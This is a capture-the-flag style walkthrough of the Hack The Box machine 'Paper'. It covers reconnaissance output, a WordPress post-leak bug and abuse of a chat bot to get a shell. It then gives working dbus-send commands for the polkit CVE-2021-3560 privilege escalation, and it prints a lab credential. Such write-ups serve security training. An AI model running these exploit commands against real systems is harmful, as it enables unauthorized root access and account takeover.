# paper

## services
``` bash

└─$ nmap -sC -sV -p 22,80,443 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-12 17:18 EDT
Nmap scan report for 10.129.172.20
Host is up (0.091s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds
```
The web servers are both returning default config files for centOS Apache servers.
In the X-Backend-Server header of the response a virtual host is leaked and we are able to access this website office.paper

## HTTP

office.paper is a wordpress web app with 3 blog posts by the user prisonmike. Gobuster revealed 5 other directories that we can access:
```bash

/wp-content           (Status: 301) [Size: 239] [--> http://office.paper/wp-content/]
/license.txt          (Status: 200) [Size: 19935]
/manual               (Status: 301) [Size: 235] [--> http://office.paper/manual/]
/wp-includes          (Status: 301) [Size: 240] [--> http://office.paper/wp-includes/]
/wp-admin             (Status: 301) [Size: 237] [--> http://office.paper/wp-admin/]
```

### tech stack
Website being run on wordpress, so I'll run wpscan to identify the wordpress version and any vulns.
```bash
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
```
Search for vulns with searchsploit:
```bash
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts            | multiple/webapps/47690.md
```
This vulnerability is CVE 2019-17671 and leaks all secret content as long as the static content assigned the value 1 is public.

###  CVE 2019-17671 
appending static=1 parameter to the end of the wp url will leak the content
``http://office.paper/?static=1``

this reveals a secret registration URL fora chat system: 
``http://chat.office.paper/register/8qozr226AhkCHZdyY``

### chat.office.paper
We can register a user with rocket chat from this link and then we are joined into a channel with employees of the office.

There is a bot in the chat that provides access to the filesystem with 2 provided functions ls ``list`` and cat ``file``. Its protected from command injection, but after traversing the directories I notice a file named cmd.cookie and it reveals code that allows the bot to execute arbitrary commands with ``recyclops cmd whoami``.

We can inject a bash reverse shell and catch it to pwn the user dwight. In writeups they used the bots ``file`` cmd to read the .env file that reveals the user dwights password.

``creds: dwight:Queenofblad3s!23``

### PrivEsc - Root
The most recent version of linpeas fails to detect the privEsc vulnerability on this machine. 
The version of polkit is vulnerable to an authentication bypass - CVE 2021-3560

A solution to this failure from linpeas is to run ``rpm -qa | grep -i polkit | grep -i "0.11[3-9]"`` to search for vulnerable polkit versions

polkit is responsible for deciding if you can do something that requires higher privileges. For example creating a new user account, polkit will decide whether or not you're allowed. Polkit will either make an instant decision or prompt for authentication.

``pkexec`` is a polkit application that can be used in a shell similar to how sudo is used. Another command that can trigger polkit is ``dbus-send``. This is the command we will use for the vulnerability. We can kill the process while its executing and get the command to execute successfully.

### HEHH?

When dbus-send is used to create a new user it follows these steps:
1. ``dbus-send`` asks ``accounts-daemon`` to create user

2. ``accounts-daemon`` receives the message with the UID unique bus id of the sender 1.99 (this is an example)

3. ``accounts-daemon`` asks polkit if the connection 1.99 is authorized to execute the command

4. polkit aks ``dbus-daemon`` for the uid of the connection: 1.99

5. If the uid is 0, polkit authorizes the request, otherwise it send a list of users who are allowed to execute the command

6. authentication agent opens dialog box for authentication from the user

7. authentication agent sends the password to polkit

8. polkit sends a "yes" back to ``accounts-daemon``

9. ``accounts-daemon`` creates the new user

**BUT** when we kill the process while its executing, we are aiming to kill the process during step 4, so that our uid is not returned. When this connection no longer exists and polkit asks ``accounts-daemon`` for the UID it returns an error. polkit mishandles this returned error and treats it as 0, which means it authorizes the request.

## Exploit

> create a new user with dbus-send
```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:reddish string:"Reddish Meow" int32:1 & sleep 0.008s ; kill $!
```
*this command is creating a new user and then killing it .008 seconds into execution. We calculated the time to kill by using time to find how long the process takes to finish and then cutting that in half*

A hashed password is required when using d-bus to set a password for a user, so we'll generate one with openssl:
```bash
┌──(kali㉿kali)-[/opt/PEASS-ng]
└─$ openssl passwd -5 test
$5$rEvjNmgcUXDOhNdg$VD6qv6pJjySRgDk8.hbHTQ6cD1b1Ed.p03vtP4hOsK4
```

> set a password for the created user
```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$rEvjNmgcUXDOhNdg$VD6qv6pJjySRgDk8.hbHTQ6cD1b1Ed.p03vtP4hOsK4' string:GoldenEye & sleep 0.004s ; kill $!
```
> sign into new users account
``su reddish``

This user is created with sudo all privileges, so after logging in, you can quickly su to root.
